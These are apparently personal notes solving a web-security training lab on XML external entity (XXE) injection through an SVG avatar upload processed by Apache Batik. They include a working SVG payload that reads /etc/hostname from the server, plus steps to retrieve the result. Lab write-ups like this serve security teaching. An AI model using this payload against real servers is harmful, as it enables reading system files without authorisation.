## Introduction
- Some applications allow users to upload files which are then processed server-side. Some common file formats use XML or contain XML subcomponents.
**Example** - 
XML-based formats are office document formats like DOCX and image formats like SVG.

**Example Scenario** - 
an application might allow users to upload images, and process or validate these on the server after they are uploaded. Even if the application expects to receive a format like PNG or JPEG, the image processing library that is being used might support SVG images.
Since the SVG format uses XML, an attacker can submit a malicious SVG image and so reach hidden attack surface for XXE vulnerabilities.

## Steps to solve lab
### Desc - Exploiting XXE via image file upload
**Our end goal** - This lab lets users attach avatars to comments and uses the Apache Batik library to process avatar image files.

To solve the lab, upload an image that displays the contents of the `/etc/hostname` file after processing. Then use the "Submit solution" button to submit the value of the server hostname.

1. Now, we already know which parameter is vulnerable which is image upload in comments so, comment below the blog with `.svg` file containing the contents as shown below:
```xml
<?xml version="1.0" standalone="yes"?><!DOCTYPE test 
[ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
<text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

![[XXE27.png]]

**In burp** - 
![[XXE28.png]]

2. Now, navigate to your upload avtar image and grab the hostname and submit it as a solution.
![[XXE29.png]]

